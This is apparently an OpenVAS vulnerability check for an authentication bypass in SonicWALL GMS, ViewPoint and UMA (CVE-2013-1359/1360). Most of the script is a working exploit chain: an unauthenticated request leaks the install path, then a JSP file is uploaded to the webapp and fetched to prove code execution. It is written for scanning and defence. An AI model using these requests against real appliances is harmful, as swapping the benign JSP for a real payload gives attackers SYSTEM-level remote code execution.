###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_SonicWALL_rce_01_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# Multiple SonicWALL Products Authentication Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Multiple SonicWALL products including Global Management System (GMS),
ViewPoint, Universal Management Appliance (UMA), and Analyzer are
prone to an authentication-bypass vulnerability.

Attackers can exploit this issue to gain administrative access to the
web interface. This allows attackers to execute arbitrary code with
SYSTEM privileges that could fully compromise the system.

The following versions are affected:

GMS/Analyzer/UMA 7.0.x GMS/ViewPoint/UMA 6.0.x GMS/ViewPoint/UMA 5.1.x
GMS/ViewPoint 5.0.x GMS/ViewPoint 4.1.x";


tag_solution = "Vendor updates are available. Please see the references for more
information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103642";

if (description)
{
 script_oid(SCRIPT_OID);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_bugtraq_id(57445);
 script_cve_id("CVE-2013-1359","CVE-2013-1360");
 script_version ("$Revision: 11 $");

 script_name("Multiple SonicWALL Products Authentication Bypass Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/57445");
 script_xref(name : "URL" , value : "http://www.sonicwall.com/");
 script_xref(name : "URL" , value : "http://sotiriu.de/adv/NSOADV-2013-001.txt");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-01-18 13:01:11 +0100 (Fri, 18 Jan 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute jsp code");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!port || !get_port_state(port))exit(0);

url = "/";
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("<title>sonicwall" >!< tolower(buf))exit(0);

host = get_host_name();

req = string(
"POST /appliance/applianceMainPage?skipSessionCheck=1 HTTP/1.1\r\n",
"TE: deflate,gzip;q=0.3\r\n",
"Connection: TE, close\r\n",
"Host: ",host,"\r\n",
"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 OpenVAS/11.0\r\n",
"Content-Length: 90\r\n",
"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
"\r\n",
"num=123456&action=show_diagnostics&task=search&item=application_log&criteria=*.*&width=500\r\n");

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("<OPTION VALUE" >!< result)exit(0);

lines = split(result);

foreach line (lines) {
  if("<OPTION VALUE" >< line) {
    a = split(line,sep:'"', keep:FALSE);
    if("logs" >< a[1]) {
      b = split(a[1],sep:"logs",keep:FALSE);
      gms_path = b[0];
      if(!isnull(gms_path))break;
    }  
  }
}

if(isnull(gms_path))exit(0);

if(gms_path =~ "^/") {
  gms_path = gms_path + "webapps/appliance/";
}  
else {
  gms_path = gms_path + 'webapps\\appliance\\';
}  

file = 'openvas_' + rand() +  '.jsp';

jsp_print = 'openvas_' + rand();;
jsp = '<% out.println( "' + jsp_print  + '" ); %>';

len = 325 + strlen(jsp) + strlen(gms_path) + strlen(file);

req = string(
"POST /appliance/applianceMainPage?skipSessionCheck=1 HTTP/1.1\r\n",
"TE: deflate,gzip;q=0.3\r\n",
"Connection: TE, close\r\n",
"Host: ",host,"\r\n",
"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 OpenVAS/11.0\r\n",
"Content-Length: ",len,"\r\n",
"Content-Type: multipart/form-data; boundary=xYzZY\r\n",
"\r\n",
"--xYzZY\r\n",
'Content-Disposition: form-data; name="action"',"\r\n",
"\r\n",
"file_system\r\n",
"--xYzZY\r\n",
'Content-Disposition: form-data; name="task"',"\r\n",
"\r\n",
"uploadFile\r\n",
"--xYzZY\r\n",
'Content-Disposition: form-data; name="searchFolder"',"\r\n",
"\r\n",
gms_path,"\r\n",
"--xYzZY\r\n",
'Content-Disposition: form-data; name="uploadFileName"; filename="',file,'"',"\r\n",
"Content-Type: text/plain\r\n",
"\r\n",
jsp,"\r\n",

"\r\n",
"--xYzZY--\r\n"); 

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result !~ "HTTP/1.. 200")exit(0);

url = '/appliance/' + file;
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(jsp_print >< buf) {

  security_hole(port:port);
  exit(0);

}  

exit(99);
